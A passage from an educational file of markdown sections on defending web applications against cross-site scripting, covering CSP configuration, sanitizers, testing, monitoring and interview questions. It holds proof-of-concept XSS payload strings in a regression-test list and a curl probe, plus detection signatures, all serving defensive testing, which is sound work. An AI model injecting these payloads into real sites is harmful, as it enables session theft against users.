      scriptSrc: ["'self'", (req, res) => "'nonce-" + res.locals.cspNonce + "'", "'strict-dynamic'"],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
    },
  })(req, res, next);
});
~~~

### Linting and static analysis as a gate, not a suggestion

Production teams enforce, in CI, ESLint rules like react/no-danger and react/no-danger-with-children (flagging every dangerouslySetInnerHTML use for manual review), Semgrep or CodeQL rules matching innerHTML/document.write/eval sinks fed by request data, and template-linters that fail the build if autoescape is disabled in a Django or Jinja2 template.

### Sanitizer as a single, shared, versioned dependency

Rather than each team reimplementing HTML sanitization, mature orgs centralize DOMPurify (or an equivalent server-side allowlist sanitizer) behind one internal wrapper module, pin its version, and subscribe to its security advisories — sanitizer bugs are patched upstream far more reliably than they would be in a homegrown implementation.

### Bug bounty and pentest cadence

Because XSS is so easy to introduce and so consequential, most public bug bounty programs (HackerOne, Bugcrowd) receive a steady stream of XSS reports; production teams triage these against a documented severity rubric (Is the origin authenticated? Does it touch HttpOnly-protected cookies? Is it stored or reflected?) rather than treating every report as equally urgent.
`,

  "industry-examples": `
- **MySpace (2005)**: Samy Kamkar's stored XSS worm exploited a filter gap in MySpace's HTML sanitization to inject a script that added "Samy is my hero" to a victim's profile and silently re-infected everyone who viewed it, reaching over one million profiles in about 20 hours — still the reference case study for why stored XSS at social scale is uniquely dangerous.
- **Twitter (2010, the "Mikeyy" worm)**: a stored XSS bug in profile fields let a worm auto-post and self-propagate across accounts, forcing an emergency patch and renewed industry attention to output encoding in social features.
- **Google**: runs one of the industry's longest-running bug bounty programs and has paid out substantial rewards specifically for XSS findings across its properties; Google also open-sourced and champions the Trusted Types API in Chromium specifically to eliminate DOM-based XSS at the browser level.
- **Cloudflare and GitHub**: both publish and continuously refine strict Content-Security-Policy configurations on high-traffic properties, and both have written publicly about the operational challenge of rolling out nonce-based CSP without breaking third-party embeds.
- **PayPal, Yahoo, and eBay**: have all had publicly disclosed, high-severity stored or reflected XSS findings (via bug bounty writeups and CVEs) in account or listing pages over the years, underscoring that even mature, security-funded organizations continue to find new XSS instances as their surface area grows.

The consistent industry pattern: the largest, best-resourced platforms are not "immune" to XSS — they are simply the ones with the CSP rollouts, bug bounty pipelines, and sanitizer investments mature enough to catch and disclose it quickly.
`,

  "best-practices": `
1. **Encode at the output boundary, in the correct context, every time** — HTML body, HTML attribute, JS, URL, and CSS each need their own encoding; never assume one encoding function covers all contexts.
2. **Prefer framework auto-escaping over hand-rolled rendering.** Let React/Vue/Django/Jinja2 do the escaping; only step outside that path when you have a specific, reviewed reason.
3. **Treat every raw-HTML escape hatch as a security-reviewed API.** dangerouslySetInnerHTML, v-html, mark_safe, and the safe filter should be centralized behind one sanitizer-wrapped helper, not scattered.
4. **Sanitize with an allowlist library (DOMPurify or equivalent), never a handwritten blacklist**, whenever raw HTML genuinely must be rendered (markdown previews, LLM output, rich text).
5. **Set HttpOnly, Secure, and SameSite on session cookies** so a successful XSS cannot trivially exfiltrate the session token (see the **Cookies & Sessions** skill for the full cookie-attribute story).
6. **Deploy a strict Content Security Policy with nonce- or hash-based script-src**, never unsafe-inline, as a compensating control for encoding bugs that slip through review.
7. **Never store secrets, API keys, or tokens in localStorage/sessionStorage** if they can be avoided — anything JS-readable is XSS-readable (see the **Secrets Management** skill).
8. **Validate URLs' scheme before using them as link targets or redirects** — reject javascript colon and data colon URIs from user input.
9. **Keep sanitizer and framework dependencies current** — mutation-XSS and clobbering bypasses are discovered and patched upstream continuously; an outdated DOMPurify version can silently reopen closed holes.
10. **Add automated regression tests with known XSS payload strings** for every component that renders user- or model-supplied content, asserting the payload appears as inert text, not as executed script.
11. **Gate merges with static analysis** (ESLint security rules, Semgrep/CodeQL) that flag new innerHTML/document.write/eval/dangerouslySetInnerHTML usage for manual review.
12. **Treat LLM output as untrusted input when rendering it in a UI** — prompt injection can steer a model to emit HTML/script-like text, so model responses need the same contextual encoding as any other user-influenceable string.
`,

  "anti-patterns": `
### Blacklisting known-bad patterns instead of encoding

~~~javascript
// WRONG: strips "<script>" but misses img/svg event handlers, javascript: URIs, and case tricks
function sanitize(input) {
  return input.replace(/<script.*?>.*?<\\/script>/gi, "");
}

// RIGHT: encode for the destination context; use an allowlist sanitizer for rich content
const safeText = escapeHtml(input);          // for plain text contexts
const safeRichHtml = DOMPurify.sanitize(input, { ALLOWED_TAGS: ["b", "i", "a"] });  // for rich content
~~~

Blacklists enumerate what you thought of; attackers enumerate what you did not.

### Building HTML via string concatenation

~~~javascript
// WRONG: no context-aware encoding anywhere in this chain
const html = "<div class=\\"card\\"><h2>" + title + "</h2><p>" + body + "</p></div>";

// RIGHT: let a templating engine or framework own the encoding
function Card({ title, body }) {
  return <div className="card"><h2>{title}</h2><p>{body}</p></div>;   // JSX auto-escapes both
}
~~~

### Trusting "it's just an internal field, users can't reach it"

Fields like a support ticket's internal note, a filename, an email Subject header, or a User-Agent string are all attacker-reachable in practice and have all been real XSS vectors in production incidents. Treat every value with any external origin as untrusted, regardless of how "internal" the field feels.

### Disabling CSP or autoescape "temporarily" to unblock a feature

~~~text
{# WRONG: turning off Django's autoescape to make a feature render "correctly" #}
{% autoescape off %}
  {{ user_bio }}
{% endautoescape %}

{# RIGHT: sanitize explicitly, keep autoescape on everywhere else #}
{{ user_bio|escape }}
~~~

These "temporary" opt-outs are rarely revisited and are a leading source of otherwise-avoidable production XSS.

### Relying solely on input validation as the security control

~~~javascript
// WRONG: rejecting angle brackets at signup does nothing for output rendered
// later in a JS context, an attribute context, or a URL context
if (/[<>]/.test(username)) throw new Error("invalid characters");

// RIGHT: allow normal input (including a name like <3 fan or O'Brien), and encode
// correctly for wherever the value is later rendered
const safeForHtml = escapeHtml(username);
~~~

### Storing user-supplied HTML unsanitized because "only admins can post"

Admin accounts get phished, admin sessions get stolen, and admin panels are themselves a common XSS target precisely because they render more powerful, less-audited HTML than public-facing pages. "Trusted user" is not a substitute for sanitizing HTML before storage and encoding before render.

### Using regex against raw strings to detect XSS instead of parsing the DOM

Regex-based filters cannot reliably parse HTML (HTML is not a regular language), which is exactly why mutation-XSS bypasses exist against naive filters — always sanitize using a real HTML/DOM parser (DOMPurify, or a server-side library built on an actual parser), never a bespoke regex.
`,

  performance: `
### Measure first

XSS defenses are cheap enough that "performance" mostly means "don't skip the defense because you assumed it was expensive" — but it is still worth knowing the actual costs, and where to look if a defense genuinely becomes a bottleneck:

~~~bash
# Browser DevTools -> Security panel: verify CSP is applied and inspect any reported violations
# DevTools -> Network -> response headers: confirm Content-Security-Policy is present and correct
# CSP report-only mode lets you measure real-world violation volume before enforcing:
#   Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-report
~~~

### The ordered hierarchy

1. **Contextual output encoding** is effectively free — a handful of character replacements per string, executed once at render time, dominated by whatever templating work the framework already does.
2. **Framework auto-escaping** (React/Vue/Django/Jinja2) adds no measurable overhead beyond normal template rendering; it is the default path, not an extra pass.
3. **Sanitization (DOMPurify)** has real, size-proportional cost because it parses the input into a DOM tree, walks it, and re-serializes it — noticeable on very large HTML blobs (tens of KB+) rendered frequently; mitigate by sanitizing once at write time (before storing) in addition to, or instead of, on every render, when the content does not need to reflect live template changes.
4. **CSP** has near-zero runtime cost in the browser (it is a set of string comparisons the browser already does for resource loading); the real cost is operational — generating a fresh cryptographic nonce per response requires a tiny bit of server CPU per request and, more importantly, disables HTTP response caching for any page that embeds a nonce (a cached response would serve a stale, mismatched nonce), which is the actual scaling concern.
5. **CSP reporting endpoints** can receive high volumes of violation reports in a broad rollout — rate-limit and sample the report endpoint itself to avoid it becoming an accidental DoS target of your own infrastructure.

Rule of thumb: never skip output encoding or auto-escaping for performance reasons — the cost is immaterial. Do think about caching implications when introducing per-request CSP nonces into a page that was previously fully cacheable.
`,

  scalability: `
### The specific scaling wrinkle: nonces defeat caching

A CSP nonce must be unique per response, which means any page carrying an inline nonce'd script cannot be served from a shared HTTP cache or CDN edge cache verbatim (every cached copy would carry someone else's nonce, mismatching the CSP header on replay). Teams that need both a CDN-cached shell and per-response nonces typically solve this by moving all script loading to non-inline, hash- or host-allowlisted external files (which do not need a nonce and cache normally), reserving nonces only for the small, necessarily-dynamic bootstrap script.

| Bottleneck | Answer |
|------------|--------|
| Per-request nonce generation at high request volume | Use a fast CSRNG (crypto.randomBytes / secrets module) — cost is microseconds, not a real bottleneck; the real cost is downstream caching, not CPU |
| CDN/edge caching broken by embedded nonces | Externalize scripts (hash- or host-allowlisted, no nonce needed) and keep only a minimal bootstrap inline |
| DOMPurify sanitization cost on large HTML payloads at high request rate | Sanitize once at write time and store the clean HTML, rather than re-sanitizing identical content on every read |
| CSP violation report volume during rollout | Deploy in Report-Only mode first, sample/rate-limit the reporting endpoint, and only enforce once report volume is well understood |
| Centralized sanitizer wrapper becoming a hot dependency across many services | Treat it like any shared library: version-pin, load-test the wrapper itself, and monitor its CPU share separately |

Horizontally, none of this changes standard web-scaling advice (stateless app servers, CDN in front, cache what is cacheable) — the only XSS-specific addition is designing your caching strategy around the fact that CSP nonces are, by definition, not cacheable.
`,

  security: `
This entire skill page is about a security vulnerability, so this section focuses on how XSS composes with, and differs from, the platform's other security topics — the connective tissue a senior engineer is expected to know.

### XSS vs CSRF — same trust model, opposite exploitation direction

XSS and CSRF (see the **CSRF** skill) both abuse the browser's implicit trust in an authenticated session, but in opposite directions. XSS makes the **victim's browser execute the attacker's code** inside the trusted origin — the attacker borrows the browser's privileges by injecting script. CSRF makes the **victim's browser send a request the attacker crafted**, using the victim's ambient credentials (cookies), without ever running any attacker code in the page — the attacker borrows the browser's ambient authentication, not its execution context. A successful XSS can also be used to defeat CSRF protections outright (by reading a CSRF token straight out of the DOM and including it in a forged request), which is why XSS is generally considered the more severe of the two: it can subsume CSRF, but not vice versa.

### XSS vs SQL Injection — the same root cause, different interpreter

XSS and SQL Injection (see the **SQL Injection** skill) are both members of OWASP's A03:2021 – Injection category (see the **OWASP Top 10** skill) because they share an identical root cause: untrusted data crossing into a context where it is interpreted as instructions rather than data, without the encoding/parameterization that context requires. SQL Injection's fix is parameterized queries (never string-building SQL); XSS's fix is contextual output encoding (never string-building HTML/JS/URLs). Recognizing this shared shape is often the fastest way to explain either vulnerability to someone who already understands the other.

### HttpOnly cookies as blast-radius limitation

Setting the HttpOnly attribute on session cookies (see the **Cookies & Sessions** skill) prevents JavaScript's document.cookie from reading them at all — so even a fully successful XSS exploit cannot directly exfiltrate the session token via script. This does not prevent the exploit or stop the attacker from acting *as* the victim within the page (the browser still attaches the cookie automatically to same-origin requests the injected script makes), but it does stop the far more durable attack of stealing the token for later, independent replay from the attacker's own machine — which is why HttpOnly is universally recommended as a mitigation, not a fix.

### Encryption, Hashing, and TLS & HTTPS — orthogonal layers

Encryption and Hashing (see those skills) protect data at rest and integrity; TLS & HTTPS protects data in transit. None of the three touch the XSS problem, because XSS operates entirely after TLS has already decrypted the response and after any hashing/encryption at the data layer has already been resolved into plain values the page renders. A page can have perfect TLS and perfect password hashing and still be fully vulnerable to XSS — they answer different threat-model questions.

### Secrets Management — what XSS actually goes after

A successful XSS exploit's most damaging goal is very often stealing credentials: session tokens, API keys accidentally exposed to client-side JavaScript, or OAuth tokens stored in localStorage (see the **Secrets Management** skill). The architectural lesson is the same one Secrets Management teaches for other contexts: minimize what sensitive material is reachable from a context an attacker might compromise — here, that context is "anything document.cookie or localStorage can read," which is exactly why HttpOnly and "never put long-lived secrets in browser storage" are paired recommendations.
`,

  testing: `
### Automated regression tests with known payload strings

~~~javascript
// Jest + Testing Library: assert user content renders as inert text, never as executed markup
import { render, screen } from "@testing-library/react";
import Comment from "./Comment";

const XSS_PAYLOADS = [
  "<img src=x onerror=alert(1)>",
  "<script>window.__pwned = true</script>",
  "javascript:alert(1)",
];

test.each(XSS_PAYLOADS)("renders payload %s as inert text, not executable markup", (payload) => {
  render(<Comment body={payload} />);
  // the payload text should be visible AS TEXT; there should be no script element in the DOM
  expect(document.querySelectorAll("script").length).toBe(0);
  expect(screen.getByText(payload, { exact: false })).toBeInTheDocument();
});
~~~

### Unit-testing the encoding functions directly

~~~python
# pytest: verify the escaping helper handles every dangerous character correctly
from myapp.security import escape_html

def test_escape_html_covers_all_special_characters():
    assert escape_html("<script>") == "&lt;script&gt;"
    assert escape_html("a & b") == "a &amp; b"
    assert escape_html("\\"quoted\\"") == "&quot;quoted&quot;"
    assert escape_html("it's") == "it&#x27;s"
~~~

### Sanitizer configuration tests

Assert the DOMPurify (or equivalent) configuration actually strips known-dangerous constructs, not just that it runs without error:

~~~javascript
test("sanitizer strips event handlers and script tags", () => {
  const dirty = "<p onclick=alert(1)>hi</p><script>evil()</script>";
  const clean = sanitizeRichText(dirty);
  expect(clean).not.toMatch(/onclick/i);
  expect(clean).not.toMatch(/<script/i);
});
~~~

### Dynamic tools: OWASP ZAP and Burp Suite

Automated scanners (OWASP ZAP in CI, Burp Suite for manual pentesting) crawl an application and inject a large corpus of known XSS payload variants into every discovered input, then check whether the response reflects them unencoded — a good complement to unit tests because it exercises the real HTTP layer and real routing, not just isolated functions.

### Senior testing doctrine

- Test the **rendered DOM structure**, not just the string output — a payload can be string-escaped correctly but still land in a dangerous sink if a later step (a second render pass, a client-side hydration step) decodes it again ("double-decode" bugs are a real, recurring category).
- Maintain one shared, versioned list of XSS payload strings (script tags, event-handler payloads, javascript URIs, mutation-XSS test vectors) used consistently across every component's test suite, so a new component automatically inherits the same coverage.
- Treat any new dangerouslySetInnerHTML / v-html / mark_safe usage introduced in a pull request as requiring an accompanying test proving the input path is sanitized — enforce this via code-review checklist, not just goodwill.
- Run CSP in Report-Only mode in staging and treat any unexpected violation as a signal that either the policy or the code needs fixing before enforcing in production.
`,

  debugging: `
### Escalation path

1. **View source vs. Inspect Element** — for stored/reflected XSS, "View Source" shows you the raw, unencoded server response; if you see your payload's angle brackets literally present (not as &lt; entities), the server-side encoding is missing. For DOM-based XSS, View Source is misleading — it shows the *original* HTML, not the DOM after client-side JavaScript has mutated it, so you must use "Inspect Element" (which shows the live DOM) instead.
2. **Browser DevTools Console** — CSP violations are logged here with the exact blocked directive and source, which is often the fastest way to confirm whether a payload was blocked by policy or never executed for another reason.
3. **DevTools Security panel** — confirms the active CSP, certificate status, and mixed-content warnings for the current page load.
4. **Reproduce with curl** — strip away browser-side complexity and confirm exactly what the server sends for a given input:

~~~bash
curl -s "https://example.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | grep -i "script"
# if the literal <script> tag appears in the output (not &lt;script&gt;), encoding is missing server-side
~~~

5. **Burp Suite / OWASP ZAP intercept** — manually modify requests in-flight to test payload variants against real server logic, including headers, cookies, and multi-step flows that curl alone cannot easily replicate.
6. **CSP report-uri / report-to debugging** — inspect the JSON reports your reporting endpoint receives; each includes the blocked-uri, violated-directive, and document-uri, which pinpoints exactly which script or resource was stopped and why.
7. **For DOM-based XSS specifically**: set a DevTools breakpoint on the specific sink (DevTools supports "DOM breakpoints" and, in Chromium, explicit event-listener breakpoints) for innerHTML assignment or eval calls, then trace the call stack backward to the untrusted source (location.hash, postMessage handler, etc.).

The single most common debugging mistake: assuming that because View Source looks safe, the page is safe. That check only rules out server-reflected XSS — it says nothing about DOM-based bugs happening after the fact in client JavaScript.
`,

  monitoring: `
### CSP violation reporting

~~~javascript
// Express endpoint receiving browser-generated CSP violation reports
app.post("/csp-report", express.json({ type: "application/csp-report" }), (req, res) => {
  const report = req.body["csp-report"];
  logger.warn("csp_violation", {
    blockedUri: report["blocked-uri"],
    violatedDirective: report["violated-directive"],
    documentUri: report["document-uri"],
    sourceFile: report["source-file"],
  });
  res.status(204).end();
});
~~~

~~~text
Content-Security-Policy: script-src 'self' 'nonce-RANDOM'; report-uri /csp-report
~~~

Feed these into your existing log pipeline (Sentry, Datadog, ELK — see the platform's Observability skills) and alert on any spike in violations, which typically indicates either an active exploitation attempt or a legitimate feature that a recent CSP tightening accidentally broke.

### What to actually measure

- **Volume of CSP violations by directive** — a sudden burst on script-src from many distinct client IPs is a stronger exploitation signal than a steady trickle from one internal QA environment.
- **WAF/reverse-proxy logs for known payload signatures** (script tags, event-handler attribute patterns, javascript colon URIs) in request parameters — useful as an early-warning layer, understanding it will never be complete (see Anti-Patterns on blacklists).
- **Bug bounty and pentest finding trends over time** — a rising rate of newly reported XSS in a specific service is an architectural smell (usually: too many raw-HTML escape hatches, or a missing centralized sanitizer) worth fixing at the pattern level, not just patching each instance.
- **Sanitizer/framework dependency advisories** — subscribe to security advisories for DOMPurify, your templating engine, and your frontend framework specifically; mXSS and clobbering bypasses are actively researched and patched upstream.

### Alerting thresholds

Alert immediately (page someone) on: CSP violations referencing a blocked-uri on a known-malicious or unexpected external domain, and any WAF signature match combined with a successful (2xx) response on an authenticated endpoint. Alert on a daily digest basis for: routine Report-Only tuning noise, and low-volume violations from known internal tooling.
`,

  deployment: `
### Production CSP configuration (Express/Node, per-line justification)

~~~javascript
const helmet = require("helmet");
const crypto = require("crypto");

// 1. Generate a fresh, cryptographically random nonce for THIS response only.
//    Reusing or predicting this value defeats the entire nonce mechanism.
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
  next();
});

// 2. Apply CSP as global middleware so no route can accidentally ship without it.
app.use((req, res, next) => {
  helmet.contentSecurityPolicy({
    directives: {
      // 3. default-src 'self' — the fallback for any directive not explicitly set;
      //    fail closed rather than fail open.
      defaultSrc: ["'self'"],
      // 4. script-src: only same-origin scripts and the per-request nonce; strict-dynamic
      //    lets a trusted bundle loader load further scripts without individually nonce-ing each one.
      scriptSrc: ["'self'", "'nonce-" + res.locals.cspNonce + "'", "'strict-dynamic'"],
      // 5. object-src 'none' — closes the legacy plugin/Flash script-execution vector entirely.
      objectSrc: ["'none'"],
      // 6. base-uri 'self' — prevents an injected <base> tag from redirecting relative URLs
      //    (including future script loads) to an attacker-controlled origin.
      baseUri: ["'self'"],
      // 7. report-uri collects violations for monitoring without necessarily blocking (see Monitoring).
      reportUri: ["/csp-report"],
    },
  })(req, res, next);
});

// 8. Additional hardening headers helmet sets by default: X-Content-Type-Options: nosniff
//    (stops MIME-sniffing that could turn a non-HTML response into executable HTML),
//    and Referrer-Policy to avoid leaking sensitive URL paths to third parties.
app.use(helmet());
~~~

### Rollout sequencing

1. **Ship in Report-Only mode first** (Content-Security-Policy-Report-Only header) for at least one full traffic cycle, to surface legitimate resources the policy would otherwise break, before enforcing.
2. **Enforce gradually**, starting with the highest-traffic, best-tested pages, then expanding — a single missed legitimate inline script can break functionality the moment enforcement flips on.
3. **Keep the nonce-generation middleware early in the pipeline** so every downstream template render has access to it; a missing nonce on a legitimate inline script is a self-inflicted outage, not a security win.
4. **Version and test the sanitizer dependency** (DOMPurify) as part of the same deployment pipeline as the application code — a stale sanitizer can silently reopen a patched mutation-XSS bypass.
`,

  "production-checklist": `
Before a feature that renders any user-, third-party-, or model-supplied content ships:

- [ ] Every output location uses the correct context-specific encoding (HTML body, attribute, JS, URL) or relies on framework auto-escaping
- [ ] Every dangerouslySetInnerHTML / v-html / mark_safe / safe-filter usage is centralized behind a single, reviewed sanitizer wrapper
- [ ] DOMPurify (or equivalent) is configured with an explicit tag/attribute allowlist, not a default "allow everything except X" blacklist
- [ ] Session cookies set HttpOnly, Secure, and an appropriate SameSite value
- [ ] Content-Security-Policy is deployed with nonce- or hash-based script-src, no unsafe-inline, and object-src none
- [ ] CSP was validated in Report-Only mode before enforcement, with a clear rollback plan
- [ ] URL values used as link targets or redirects are scheme-validated (http/https only)
- [ ] No secrets, session tokens, or API keys are stored in localStorage/sessionStorage unnecessarily
- [ ] Automated tests exist covering a shared XSS payload corpus for every component rendering external content
- [ ] Static analysis (ESLint security rules, Semgrep/CodeQL) runs in CI and gates merges on new dangerous-sink usage
- [ ] LLM-generated or model-influenced output is treated as untrusted input at render time
- [ ] CSP violation reports flow into monitoring with alerting thresholds defined
- [ ] Sanitizer and templating/framework dependencies are on a current, advisory-tracked version
- [ ] A recent (within the last review cycle) pentest or bug-bounty scope covers the feature's new inputs
- [ ] Code review explicitly checked every new raw-HTML escape hatch introduced in the change
`,

  "common-mistakes": `
1. **Assuming input validation is sufficient** — validation checks data quality, not the encoding a specific output context requires; the two solve different problems, and skipping the second because the first passed is the single most common root cause.
2. **Encoding once, at input time, and trusting it forever** — the same value can be output-rendered in multiple contexts later (HTML, attribute, JS, URL), each needing its own encoding; a single upfront encoding pass cannot anticipate all of them.
3. **Using innerHTML by default instead of textContent** for plain-text content — a habit carried over from "it's more convenient," not from any actual need to render markup.
4. **Forgetting that DOM-based XSS never touches the server** — reviewing only server logs and server-rendered output misses this entire category; it requires reading the client-side JavaScript itself.
5. **Reusing a CSP nonce across multiple requests** (often for caching convenience) — this defeats the nonce mechanism entirely, since a stolen or predicted nonce becomes valid for every response sharing it.
6. **Setting unsafe-inline in script-src "temporarily" and never removing it** — this disables CSP's core protection while leaving the header present, giving false confidence that a policy is enforced.
7. **Hand-rolling a sanitizer with regex** instead of using an actively maintained, allowlist-based library — HTML is not a regular language, and mutation-XSS specifically targets exactly this class of mistake.
8. **Trusting "internal" or "admin-only" fields** as safe to render unencoded — admin sessions are high-value targets, and the field being internal does not change what the browser will do with unencoded markup.
9. **Not treating LLM/agent output as untrusted** — prompt injection is a live technique for steering model output, and a chat UI rendering that output directly is functionally identical to any other unencoded user-content renderer.
10. **Disabling framework autoescape at the template level to "fix" a rendering issue** rather than fixing the actual encoding need at the specific value that required raw HTML.
`,

  "common-errors": `
| Error / symptom | Typical cause | Fix |
|------------------|----------------|-----|
| Payload text renders literally as visible text (e.g., angle-bracket-script visible on the page) | Encoding is working correctly | Nothing to fix — this IS the correct, safe behavior |
| Refused to execute inline script because it violates CSP directive script-src | A legitimate inline script lacks a matching nonce/hash | Add the correct nonce attribute, or move the script to an external, allowlisted file |
| CSP report shows blocked-uri: inline repeatedly after deployment | unsafe-inline was removed but some templates still emit inline scripts without nonces | Audit templates for every inline script tag; add nonces or externalize |
| innerHTML assignment silently does nothing for a literal script tag string | Browsers do not execute script elements created via innerHTML | Expected browser behavior — but do not rely on it as a defense; other tags (img/svg with event handlers) still execute |
| Sanitized output still triggers an alert in testing | Sanitizer configuration allows a dangerous attribute/tag, or a known mutation-XSS bypass in an outdated sanitizer version | Tighten the allowlist; upgrade the sanitizer to a version with the mXSS fix |
| Feature breaks after enabling a strict CSP (fonts/images/scripts fail to load) | Overly narrow default-src/script-src missing a legitimate third-party source | Add the specific required source explicitly, or self-host the resource instead of broadening the policy |
| Escaped output shows literal &amp;lt; instead of &lt; (double-encoding) | Value was encoded twice — once at storage time and again at render time | Encode exactly once, at the final render/output boundary, not at storage |
| DOM clobbering-style bug: expected object/config is unexpectedly an HTMLElement | Attacker-controlled HTML with a matching id/name shadowed a global variable | Namespace configuration explicitly; verify the runtime type of any value read from an implicit global before trusting it |
`,

  faqs: `
**Q: If a WAF blocks known XSS payload patterns, do I still need output encoding?**
Yes. A WAF is a pattern-matching filter operating on request strings; it cannot understand every context a value will later be rendered into, and it can be bypassed by encoding tricks or unusual markup it was not tuned for. It is a useful early-warning and blast-radius reducer, never a substitute for encoding at render time.

**Q: Does HTTPS/TLS protect against XSS?**
No. TLS protects data in transit between browser and server; XSS operates entirely after decryption, inside the rendered page. See the **TLS & HTTPS** skill — the two are unrelated threat models.

**Q: Is React (or Vue, or Django) "immune" to XSS?**
No framework is immune — each has a well-documented, deliberately named escape hatch (dangerouslySetInnerHTML, v-html, the safe filter/mark_safe) that reintroduces the exact same risk the framework otherwise prevents. What frameworks change is the default: safe by default, unsafe only by explicit, greppable opt-in.

**Q: Can XSS happen without any server involvement at all?**
Yes — this is exactly what DOM-based XSS is: a client-side source (location.hash, postMessage, document.referrer) flowing into a client-side sink (innerHTML, eval) with no server request carrying the payload at all.

**Q: Should I sanitize on input, on output, or both?**
Sanitize (or rather, validate) input for data quality; encode or sanitize on output for security, at the actual rendering boundary, for the actual context being rendered into. Doing only the input step is the most common mistake described in Intermediate Concepts.

**Q: What is the single highest-leverage fix if I can only do one thing?**
Correct, contextual output encoding (or relying on your framework's auto-escaping and never bypassing it without also sanitizing). CSP and HttpOnly cookies are valuable, but both are compensating controls for when encoding fails, not replacements for it.

**Q: Is XSS still relevant with modern frameworks doing auto-escaping everywhere?**
Yes — DOM-based XSS, mutation XSS, DOM clobbering, and the ever-present raw-HTML escape hatches mean XSS remains a live, actively researched vulnerability class, and LLM-driven UIs have introduced a genuinely new source of attacker-influenceable text (model output) that many teams have not yet accounted for in their threat models.

**Q: How severe is a "self-XSS" report (where the victim has to paste a payload into their own console)?**
Generally low severity, because it requires social engineering the victim into attacking themselves and does not represent an application flaw exploitable against other users; most bug bounty programs explicitly exclude or heavily discount pure self-XSS unless it can be chained into something that affects other users (e.g., via clickjacking a paste action).
`,

  "interview-questions": `
**Junior/Mid:**

1. *What are the three classic types of XSS, and how do they differ?* Stored (persisted server-side, served to every viewer), reflected (round-trips through a single request, typically via a crafted URL), and DOM-based (entirely client-side, source and sink both in JavaScript, never necessarily touching the server).
2. *Why doesn't a script tag inserted via innerHTML execute in most browsers?* The HTML tree-construction algorithm marks script elements created this way as inert; this is a well-known quirk, which is exactly why real payloads favor event-handler attributes (img onerror, svg onload) that DO fire on element insertion.
3. *What is the difference between HTML entity encoding and URL encoding, and when do you use each?* HTML entity encoding (ampersand-lt-semicolon etc.) is for content placed in an HTML body/attribute context; URL/percent encoding is for values placed inside a URL. Using the wrong one for a given context leaves the string exploitable in that specific context.
4. *What does the dangerouslySetInnerHTML prop in React do, and why is it named that way?* It bypasses React's default escaping and inserts raw HTML directly; the deliberately alarming name is meant to make every usage grep-able and force a conscious security decision at each call site.
5. *Why is "just sanitize the input" considered bad advice by security engineers?* Because the same value can be rendered later into multiple different contexts (HTML, attribute, JS, URL) each needing distinct encoding, and a single upfront pass cannot anticipate all of them; the correct control is contextual output encoding at render time.

**Senior:**

6. *Explain how a Content Security Policy nonce works and what breaks it.* A per-response random token placed in both the script-src header and a nonce attribute on legitimate inline scripts; the browser only executes inline script whose nonce matches. It is broken by reusing the same nonce across responses, by a header-injection bug that lets an attacker read/predict it, or by an overly broad policy that also allows unsafe-inline.
7. *What is mutation XSS (mXSS), and why can a sanitizer that checks the input string still be bypassed?* A payload that is not dangerous as a string can become dangerous once the browser's HTML parser processes and re-serializes it (e.g., via an innerHTML round trip), producing structurally different markup than what was checked; the fix is sanitizing using an actual DOM parser (like DOMPurify) tested against known mutation vectors, not a regex over the raw string.
8. *Explain DOM clobbering and why it defeats script-focused sanitizers.* Attacker-controlled, script-free HTML with a matching id/name attribute can overwrite a global JavaScript variable or expected DOM property the application implicitly trusts, hijacking logic without executing any script at all — sanitizers that only strip executable constructs do not address this because clobbering payloads contain none.
9. *How does XSS relate to CSRF architecturally, and why is XSS considered more severe?* Both abuse the browser's implicit trust in an authenticated session, but XSS makes the victim's browser execute attacker code (borrowing execution context), while CSRF makes the victim's browser send a forged request using ambient credentials (borrowing authentication) without running any attacker code. A successful XSS can defeat CSRF protections outright (reading the CSRF token from the DOM), so XSS subsumes CSRF's capability but not the reverse.
10. *Why does HttpOnly not "fix" XSS?* It stops document.cookie from exfiltrating the session token for independent replay, but an injected script still runs inside the page and can still make same-origin requests carrying the cookie automatically, performing any action the victim could — HttpOnly limits blast radius, it does not stop the exploit.
11. *Design a layered defense for a feature that must render arbitrary rich-text HTML (e.g., an LLM chat response with formatting).* Sanitize with an allowlist library (DOMPurify) configured to permit only a small, explicitly justified tag/attribute set; render through it rather than raw innerHTML; back it with a strict CSP as a compensating control; treat the model output itself as untrusted given prompt-injection risk; add regression tests with known payload and mutation-XSS corpora.
12. *Why can CSP fail to stop a DOM-based XSS attack even when correctly configured?* CSP governs script *execution sources*; DOM-based attacks that manipulate already-trusted DOM elements (rewriting existing text/attributes without introducing a new script element) do not necessarily require loading a new script source, so a strict script-src alone does not address the underlying sink misuse — encoding at the sink is still required.
`,

  "coding-questions": `
### 1. Implement a context-correct HTML entity encoder

~~~python
# Encode a string for safe insertion into an HTML body context.
def escape_html(value: str) -> str:
    replacements = [
        ("&", "&amp;"),   # MUST be first, or later replacements get double-encoded
        ("<", "&lt;"),
        (">", "&gt;"),
        ('"', "&quot;"),
        ("'", "&#x27;"),
    ]
    for old, new in replacements:
        value = value.replace(old, new)
    return value

assert escape_html("<script>alert(1)</script>") == "&lt;script&gt;alert(1)&lt;/script&gt;"
assert escape_html("Tom & Jerry") == "Tom &amp; Jerry"
assert escape_html("O'Brien said \\"hi\\"") == "O&#x27;Brien said &quot;hi&quot;"
~~~

Complexity: O(n) in the length of the input, one linear pass per replacement (small constant factor, five passes). Follow-ups they will ask: "why must ampersand be replaced first?" (otherwise you would re-encode the ampersand your own encoding just inserted); "how would you handle a JS-context string instead?" (different escape table entirely — backslash, quotes, and unicode-escaping angle brackets, as covered in Intermediate Concepts).

### 2. Build a minimal allowlist HTML sanitizer

~~~python
# A simplified, teaching-purpose allowlist sanitizer using Python's html.parser.
# (Production code should use a maintained library, e.g. bleach or DOMPurify on the client.)
from html.parser import HTMLParser

ALLOWED_TAGS = {"b", "i", "em", "strong", "p", "a"}
ALLOWED_ATTRS = {"a": {"href"}}

class AllowlistSanitizer(HTMLParser):
    def __init__(self):
        super().__init__()
        self.output = []

    def handle_starttag(self, tag, attrs):
        if tag not in ALLOWED_TAGS:
            return   # drop disallowed tags entirely (including their would-be script/event attrs)
        safe_attrs = [
            (k, v) for k, v in attrs
            if k in ALLOWED_ATTRS.get(tag, set()) and not v.strip().lower().startswith("javascript:")
        ]
        attr_str = "".join(' {}="{}"'.format(k, escape_html(v)) for k, v in safe_attrs)
        self.output.append("<{}{}>".format(tag, attr_str))

    def handle_endtag(self, tag):
